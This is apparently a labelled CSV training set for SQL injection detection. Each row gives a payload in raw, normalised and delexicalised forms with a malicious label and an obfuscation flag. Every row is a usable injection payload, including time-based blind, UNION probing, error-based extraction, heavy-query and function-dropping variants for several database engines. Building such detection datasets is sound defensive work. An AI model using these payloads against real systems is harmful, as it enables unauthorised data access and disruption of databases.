payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg","1"" ) ) ) and sleep ( 5 ) and ( ( ( ""bvgg"" = ""bvgg",<NUM><STR>bvgg<STR>bvgg,1,False,,sqli_dataset
1 and 7533  =  7533-- spzi,1 and 7533 = 7533-- spzi,<NUM> and <NUM> = <NUM>-- spzi,1,False,,sqli_dataset
"-1644%' or make_set  (  9354  =  9354,7185  )   and '%'  =  '","-1644%' or make_set ( 9354 = 9354,7185 ) and '%' = '",-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1 where 4331  =  4331 union all select null,null,null,null,null,null#","1 where 4331 = 4331 union all select null,null,null,null,null,null#","<NUM> where <NUM> = <NUM> union all select null,null,null,null,null,null#",1,False,,sqli_dataset
1  )   as qort where 1554  =  1554,1 ) as qort where 1554 = 1554,<NUM> ) as qort where <NUM> = <NUM>,1,False,,sqli_dataset
"1""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --","1"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --","<NUM>"" ) ) ) and <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --",1,False,,sqli_dataset
1  )   where 5418  =  5418 union all select null--,1 ) where 5418 = 5418 union all select null--,<NUM> ) where <NUM> = <NUM> union all select null--,1,False,,sqli_dataset
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'eocx'  =  'eocx,1' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'eocx' = 'eocx,<NUM><STR>eocx<STR>eocx,1,False,,sqli_dataset
"1"" where 4294  =  4294 and make_set  (  2543  =  7988,7988  )  --","1"" where 4294 = 4294 and make_set ( 2543 = 7988,7988 ) --","<NUM>"" where <NUM> = <NUM> and make_set ( <NUM> = <NUM>,<NUM> ) --",1,False,,sqli_dataset
1'   )    )    and 4595  =  4595#,1' ) ) and 4595 = 4595#,<NUM>' ) ) and <NUM> = <NUM>#,1,False,,sqli_dataset
-6680'  )   or 5483  =  3031 and   (  'zxes'  =  'zxes,-6680' ) or 5483 = 3031 and ( 'zxes' = 'zxes,-<NUM><STR>zxes<STR>zxes,1,False,,sqli_dataset
"1',  (  select   (  case when   (  2073  =  5314  )   then 1 else 1/  (  select 0  )   end   )    )","1', ( select ( case when ( 2073 = 5314 ) then 1 else 1/ ( select 0 ) end ) )","<NUM>', ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) )",1,False,,sqli_dataset
"1' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM><STR>abcdefg',upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,False,,sqli_dataset
"1""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""sjiz"" like ""sjiz","1"" ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""sjiz"" like ""sjiz",<NUM><STR>sjiz<STR>sjiz,1,False,,sqli_dataset
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'pneh' like 'pneh,1' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'pneh' like 'pneh,<NUM><STR>pneh<STR>pneh,1,False,,sqli_dataset
"1  )   where 4768  =  4768 union all select null,null,null,null,null,null,null,null#","1 ) where 4768 = 4768 union all select null,null,null,null,null,null,null,null#","<NUM> ) where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null#",1,False,,sqli_dataset
1'  )   where 5286  =  5286,1' ) where 5286 = 5286,<NUM>' ) where <NUM> = <NUM>,1,False,,sqli_dataset
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ytxg'  =  'ytxg,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'ytxg' = 'ytxg,<NUM><STR>ytxg<STR>ytxg,1,False,,sqli_dataset
"1%""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","1%"" ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>%"" ) ) ) and <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,False,,sqli_dataset
"1%'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  '%'  =  '","1%' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1%"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  ""","1%"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
1'+  (  select hvsb where 3666  =  3666,1'+ ( select hvsb where 3666 = 3666,<NUM>'+ ( select hvsb where <NUM> = <NUM>,1,True,,sqli_dataset
if  (  2697  =  2008  )   select 2697 else drop function jcoo--,if ( 2697 = 2008 ) select 2697 else drop function jcoo--,if ( <NUM> = <NUM> ) select <NUM> else drop function jcoo--,1,False,,sqli_dataset
"1 where 6119  =  6119 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","1 where 6119 = 6119 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM> where <NUM> = <NUM> or <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,False,,sqli_dataset
-8710 or 9323  =  9323#,-8710 or 9323 = 9323#,-<NUM> or <NUM> = <NUM>#,1,False,,sqli_dataset
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'zoin' = 'zoin,<NUM><STR>zoin<STR>zoin,1,False,,sqli_dataset
"-7996""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""iuzv"" like ""iuzv","-7996"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""iuzv"" like ""iuzv",-<NUM><STR>iuzv<STR>iuzv,1,False,,sqli_dataset
"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""knbx""  =  ""knbx","1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""knbx"" = ""knbx",<NUM><STR>knbx<STR>knbx,1,False,,sqli_dataset
"1'   )    )    as fjbe where 4662  =  4662 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","1' ) ) as fjbe where 4662 = 4662 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>' ) ) as fjbe where <NUM> = <NUM> or <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,False,,sqli_dataset
"-5732'  )   union all select 7614,7614,7614,7614--","-5732' ) union all select 7614,7614,7614,7614--","-<NUM>' ) union all select <NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1"" union all select null,null,null,null,null--","1"" union all select null,null,null,null,null--","<NUM>"" union all select null,null,null,null,null--",1,False,,sqli_dataset
-4157'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'rdhm'  =  'rdhm,-4157' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'rdhm' = 'rdhm,-<NUM><STR>rdhm<STR>rdhm,1,False,,sqli_dataset
"-7412""  )   as qngt where 2041  =  2041 union all select 2041--","-7412"" ) as qngt where 2041 = 2041 union all select 2041--","-<NUM>"" ) as qngt where <NUM> = <NUM> union all select <NUM>--",1,False,,sqli_dataset
"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap","-8673"" ) or make_set ( 9354 = 9354,7185 ) and ( ""edap"" like ""edap",-<NUM><STR>edap<STR>edap,1,False,,sqli_dataset
"1"" order by 1--","1"" order by 1--","<NUM>"" order by <NUM>--",1,False,,sqli_dataset
"-4721'  )   or elt  (  4378  =  5165,5165  )   and   (  'fufn'  =  'fufn","-4721' ) or elt ( 4378 = 5165,5165 ) and ( 'fufn' = 'fufn",-<NUM><STR>fufn<STR>fufn,1,False,,sqli_dataset
"1   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   2748  =  2748","1 ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 2748 = 2748","<NUM> ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( <NUM> = <NUM>",1,True,,sqli_dataset
"1""  )   where 9648  =  9648 and elt  (  1210  =  1210,sleep  (  5   )    )   --","1"" ) where 9648 = 9648 and elt ( 1210 = 1210,sleep ( 5 ) ) --","<NUM>"" ) where <NUM> = <NUM> and elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) --",1,False,,sqli_dataset
"1""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""fpwu"" like ""fpwu","1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""fpwu"" like ""fpwu",<NUM><STR>fpwu<STR>fpwu,1,False,,sqli_dataset
"-5294%""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""%""  =  ""","-5294%"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""%"" = """,-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1  )   where 2741  =  2741 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","1 ) where 2741 = 2741 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM> ) where <NUM> = <NUM> and <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,False,,sqli_dataset
"1,  (  select * from generate_series  (  9108,9108,case when   (  9108  =  2900  )   then 1 else 0 end  )   limit 1  )","1, ( select * from generate_series ( 9108,9108,case when ( 9108 = 2900 ) then 1 else 0 end ) limit 1 )","<NUM>, ( select * from generate_series ( <NUM>,<NUM>,case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) limit <NUM> )",1,False,,sqli_dataset
"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--","-3620'|| ( select 'kmei' where 8533 = 8533 union all select 8533,8533,8533,8533--","-<NUM><STR>kmei' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj","1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ibdj' = 'ibdj",<NUM><STR>ibdj<STR>ibdj,1,True,,sqli_dataset
-9327'  )   or 3038  =  3038,-9327' ) or 3038 = 3038,-<NUM>' ) or <NUM> = <NUM>,1,False,,sqli_dataset
"-9829'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","-9829' ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #","-<NUM>' ) ) ) or <NUM> group by concat ( 0x7171706a71, ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) having min ( <NUM> ) #",1,True,,sqli_dataset
begin user_lock.sleep  (  5  ),begin user_lock.sleep ( 5 ),begin user_lock.sleep ( <NUM> ),1,False,,sqli_dataset
"1""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1"" ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>"" ) ) or <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,False,,sqli_dataset
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'toft'  =  'toft","1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'toft' = 'toft",<NUM><STR>toft<STR>toft,1,True,,sqli_dataset
"1' where 1602  =  1602 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --","1' where 1602 = 1602 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --","<NUM>' where <NUM> = <NUM> or ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) ) --",1,True,,sqli_dataset
1  )   where 9167  =  9167,1 ) where 9167 = 9167,<NUM> ) where <NUM> = <NUM>,1,False,,sqli_dataset
"1""  )   as dien where 4022  =  4022","1"" ) as dien where 4022 = 4022","<NUM>"" ) as dien where <NUM> = <NUM>",1,False,,sqli_dataset
1   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1 ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,<NUM> ) ) and <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --,1,False,,sqli_dataset
"-1083%""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""%""  =  ""","-1083%"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""%"" = """,-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""dwbh"" like ""dwbh","call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""dwbh"" like ""dwbh","call regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) and <STR> like ""dwbh",1,False,,sqli_dataset
"-9197%""   )    )     )   union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#","-9197%"" ) ) ) union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#","-<NUM>%"" ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"1%""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  ""","1%"" ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """,<NUM>%<STR>%<STR>,1,True,,sqli_dataset
1'||  (  select 'tezo' from dual where 4436  =  4436,1'|| ( select 'tezo' from dual where 4436 = 4436,<NUM><STR>tezo' from dual where <NUM> = <NUM>,1,False,,sqli_dataset
"-8684 union all select 9519,9519,9519,9519--","-8684 union all select 9519,9519,9519,9519--","-<NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
1'   )    )    as zari where 6847  =  6847,1' ) ) as zari where 6847 = 6847,<NUM>' ) ) as zari where <NUM> = <NUM>,1,False,,sqli_dataset
"-9588'   )    )    union all select 7280,7280,7280,7280,7280,7280,7280,7280,7280,7280--","-9588' ) ) union all select 7280,7280,7280,7280,7280,7280,7280,7280,7280,7280--","-<NUM>' ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1' or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM><STR>abcdefg',upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,False,,sqli_dataset
"1""  )   as rbgl where 3822  =  3822 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --","1"" ) as rbgl where 3822 = 3822 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --","<NUM>"" ) as rbgl where <NUM> = <NUM> procedure analyse ( extractvalue ( <NUM>,concat ( 0x5c, ( benchmark ( <NUM>,md5 ( 0x52515a50 ) ) ) ) ) ,<NUM> ) --",1,True,,sqli_dataset
"-3781  )   union all select 3916,3916,3916--","-3781 ) union all select 3916,3916,3916--","-<NUM> ) union all select <NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""seci""  =  ""seci","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""seci"" = ""seci","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( <STR> = ""seci",1,False,,sqli_dataset
